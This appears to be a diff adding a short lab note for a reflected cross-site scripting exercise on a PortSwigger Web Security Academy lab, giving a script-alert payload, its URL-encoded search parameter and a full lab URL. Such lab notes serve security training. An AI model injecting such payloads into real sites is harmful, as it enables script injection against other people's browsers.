@@ -1,0 +1,9 @@
+`<script>alert(1)</script>`
+
+Working payload (URL-encoded for browser)
+?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+
+Full URL example:
+https://[lab-id].web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
